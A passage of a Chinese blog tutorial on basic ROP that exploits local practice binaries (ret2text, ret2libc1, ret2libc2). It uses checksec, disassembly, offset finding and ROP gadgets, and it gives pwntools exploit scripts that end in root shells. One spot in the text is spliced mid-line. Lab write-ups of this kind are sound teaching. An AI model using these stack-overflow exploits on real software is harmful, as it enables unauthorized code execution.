3eret2text\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eret2text\u003c/code\u003e 即控制程序执行程序本身已有的的代码 (即， \u003ccode\u003e.text\u003c/code\u003e 段中的代码) \u003c/p\u003e\n\u003cp\u003e收查看程序保护机制\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2text checksec ret2text          \n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e仅仅开启\u003ccode\u003eNX\u003c/code\u003e ，并且是 \u003ccode\u003e32\u003c/code\u003e 位程序\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003egets\u003c/code\u003e函数，很明显存在缓冲区溢出漏洞，并且没有做边界保护\u003c/p\u003e\n\u003cp\u003e并且\u003ccode\u003esecure\u003c/code\u003e函数中有 \u003ccode\u003e/bin/sh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evoid \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003esecure\u003c/span\u003e\u003c/span\u003e()\n{\n  unsigned int v0; // eax\n  int input; // [esp+18h] [ebp-10h] BYREF\n  int secretcode; // [esp+1Ch] [ebp-Ch]\n\n  v0 = \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e(0);\n  srand(v0);\n  secretcode = rand();\n  __isoc99_scanf(\u0026#x26;unk_8048760, \u0026#x26;input);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( input == secretcode )\n    system(\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e定位\u003ccode\u003esystem\u003c/code\u003e函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e disas secure\nDump of assembler code \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e secure:\n   0x080485fd \u0026#x3C;+0\u003e:     push   ebp\n   0x080485fe \u0026#x3C;+1\u003e:     mov    ebp,esp\n   0x08048600 \u0026#x3C;+3\u003e:     sub    esp,0x28\n   0x08048603 \u0026#x3C;+6\u003e:     mov    DWORD PTR [esp],0x0\n   0x0804860a \u0026#x3C;+13\u003e:    call   0x8048470 \u0026#x3C;\u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e@plt\u003e\n   0x0804860f \u0026#x3C;+18\u003e:    mov    DWORD PTR [esp],eax\n   0x08048612 \u0026#x3C;+21\u003e:    call   0x80484b0 \u0026#x3C;srand@plt\u003e\n   0x08048617 \u0026#x3C;+26\u003e:    call   0x80484e0 \u0026#x3C;rand@plt\u003e\n   0x0804861c \u0026#x3C;+31\u003e:    mov    DWORD PTR [ebp-0xc],eax\n   0x0804861f \u0026#x3C;+34\u003e:    lea    eax,[ebp-0x10]\n   0x08048622 \u0026#x3C;+37\u003e:    mov    DWORD PTR [esp+0x4],eax\n   0x08048626 \u0026#x3C;+41\u003e:    mov    DWORD PTR [esp],0x8048760\n   0x0804862d \u0026#x3C;+48\u003e:    call   0x80484f0 \u0026#x3C;__isoc99_scanf@plt\u003e\n   0x08048632 \u0026#x3C;+53\u003e:    mov    eax,DWORD PTR [ebp-0x10]\n   0x08048635 \u0026#x3C;+56\u003e:    cmp    eax,DWORD PTR [ebp-0xc]\n   0x08048638 \u0026#x3C;+59\u003e:    jne    0x8048646 \u0026#x3C;secure+73\u003e\n   0x0804863a \u0026#x3C;+61\u003e:    mov    DWORD PTR [esp],0x8048763\n   0x08048641 \u0026#x3C;+68\u003e:    call   0x8048490 \u0026#x3C;system@plt\u003e\n   0x08048646 \u0026#x3C;+73\u003e:    leave\n   0x08048647 \u0026#x3C;+74\u003e:    ret\nEnd of assembler dump.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003e0x0804863a\u003c/code\u003e处\u003c/p\u003e\n\u003cp\u003e接下来计算偏移量，使用 \u003ccode\u003epwndbg\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e反编译\u003ccode\u003emain\u003c/code\u003e找到\u003ccode\u003egets\u003c/code\u003e \u003ccode\u003e0x080486ae\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e disas main\nDump png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e32\u003c/code\u003e 位程序，并且调用动态链接库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2libc file ret2libc1         \nret2libc1: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eNX\u003c/code\u003e 启动，所以\u003ccode\u003eret2shellcode\u003c/code\u003e 也无法使用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2libc checksec ret2libc1 \n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e因为这里用了动态链接库，所以优先使用 \u003ccode\u003eret2libc\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e字符串中能看到 \u003ccode\u003e/bin/sh\u003c/code\u003e \u003ccode\u003e08048720\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试寻找 \u003ccode\u003esystem\u003c/code\u003e函数，也找到了\u003ccode\u003e08048460\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e计算偏移值（和上边一样的操作）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e cyclic -l daab\nFinding cyclic pattern of 4 bytes: b\u003cspan class=\"hljs-string\"\u003e'daab'\u003c/span\u003e (hex: 0x64616162)\nFound at offset 112\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e exp.py \nfrom pwn import *\n\nsystem_plt_addr = 0x08048460\nbin_sh_addr = 0x8048720\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc1'\u003c/span\u003e)\nsh.sendline(112 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e + p32(system_plt_addr) + 4 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e + p32(bin_sh_addr))\nsh.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到为什么要加上 \u003ccode\u003e4 * b'A'\u003c/code\u003e ，因为这是给\u003ccode\u003esystem\u003c/code\u003e的假的返回地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e           | ... higher addresses ...   |\n           +----------------------------+\n           | p32(bin_sh_addr)           | \u0026#x3C;-- (被我们写入) system 的参数\n           +----------------------------+\n           | 4 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e (0x41414141)      | \u0026#x3C;-- (被我们写入) system 的假返回地址\n           +----------------------------+\n           | p32(system_plt_addr)       | \u0026#x3C;-- (被我们写入) 覆盖了 main 的返回地址\n           +----------------------------+\n           | 4 字节的 \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e               | \u0026#x3C;-- (被我们写入) 覆盖了 old EBP\n           +----------------------------+\n           | 108 字节的 \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e             | \\\n           | ...                        |  |\n           | \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e                        |  } 填充了整个 buffer 和额外的空间\n           | \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e                        | /\n           +----------------------------+ \u0026#x3C;-- buffer 的起始地址\n           | ... lower addresses ...    |\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc python exp.py\n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2libc1'\u003c/span\u003e: pid 3166\n[*] Switching to interactive mode\nRET2LIBC \u003e_\u0026#x3C;\n$ \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nroot\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eret2libc2\u003c/h3\u003e\n\u003cp\u003e依旧是 \u003ccode\u003egets\u003c/code\u003e ，存在缓冲区溢出漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003echecksec\u003c/code\u003e以及文件类型，和\u003ccode\u003eret2libc1\u003c/code\u003e基本没差\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc checksec ret2libc1\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n(pwn) ➜  ret2libc file ret2libc2         \nret2libc2: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e字符串中找不到 \u003ccode\u003e/bin/sh\u003c/code\u003e了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esystem\u003c/code\u003e 函数还在 \u003ccode\u003e0x08048490\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e所以需要我们构造 \u003ccode\u003e/bin/sh\u003c/code\u003e \u003ccode\u003e0x08048480\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e可以看到还存在\u003ccode\u003egets\u003c/code\u003e \u003ccode\u003e0x08048460\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们可以多调用一次\u003ccode\u003egadget\u003c/code\u003e ，所以我们要找到一片可读写的缓冲区\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ebuf2\u003c/code\u003e区域刚好可以 \u003ccode\u003e0x0804A080\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e此时我们还要保持堆栈平衡，也就是\u003ccode\u003egets\u003c/code\u003e执行完时，\u003ccode\u003egets\u003c/code\u003e的返回地址会处于栈顶，但是接下来我们调用\u003ccode\u003esystem\u003c/code\u003e函数，所以我们需要在返回地址\u003ccode\u003e+4\u003c/code\u003e(就是要把\u003ccode\u003ebuf\u003c/code\u003e清理掉，让\u003ccode\u003eROP\u003c/code\u003e链指向下一条也就是\u003ccode\u003esystem\u003c/code\u003e)，所以这里可以寻找 \u003ccode\u003epop xxx ;ret\u003c/code\u003e 或者 \u003ccode\u003eadd esp 4; ret\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eESP --\u003e | p32(pop_ebx_addr) |  \u0026#x3C;-- gets函数的“返回地址”\n        +-------------------+\n        |  p32(buf2_addr)   |  \u0026#x3C;-- gets函数的参数（gets写入后，我们需要将其弹出）\n        +-------------------+\n        | p32(libc_system_addr) |\n        +-------------------+\n        |      b\u003cspan class=\"hljs-string\"\u003e'B'\u003c/span\u003e*4       |\n        +-------------------+\n        |  p32(buf2_addr)   |\n        +-------------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eROPgadget\u003c/code\u003e来寻找\u003ccode\u003e0x0804843d\u003c/code\u003e 就符合\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc ROPgadget --binary ret2libc2 --only \u003cspan class=\"hljs-string\"\u003e\"pop|ret\"\u003c/span\u003e\nGadgets information\n============================================================\n0x0804872f : pop ebp ; ret\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e计算偏移值，也和上边一样是\u003ccode\u003e112\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\n\ngets_plt_addr = 0x08048460\npop_ebx_ret_addr = 0x0804843d\nsystem_plt_addr = 0x08048490\nbuf2 = 0x0804A080\n\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc2'\u003c/span\u003e)\nsh.sendline(112 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e + p32(gets_plt_addr) + p32(pop_ebx_ret_addr) + p32(buf2) + p32(system_plt_addr) + 4 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e + p32(buf2))\nsh.sendline(\u003cspan class=\"hljs-string\"\u003e'/bin/sh'\u003c/span\u003e)\nsh.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc python exp.py   \n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2libc2'\u003c/span\u003e: pid 4087\n/root/Desktop/Test/StackBufferOverFlow/ret2libc/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  sh.sendline(\u003cspan class=\"hljs-string\"\u003e'/bin/sh'\u003c/span\u003e)\n[*] Switching to interactive mode\nSomething surprise here, but I don\u003cspan class=\"hljs-string\"\u003e't think it will work.\nWhat do you think ?$ id\nuid=0(root) gid=0(root) 组=0(root)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e尚未更完…\u003c/h2\u003e","title":"PWN - 基本ROP","date":"2025-06-14","updated":"2025-06-14","tags":["PWN","ROP","ret2text","ret2shellcode","ret2syscall","ret2libc"],"categories":"二进制安全","comments":true},"recentPosts":[{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"14"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"06","day":"14","id":"PWN - 基本ROP"},"buildId":"EU_5O1WLk-3U445YGXtDc","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
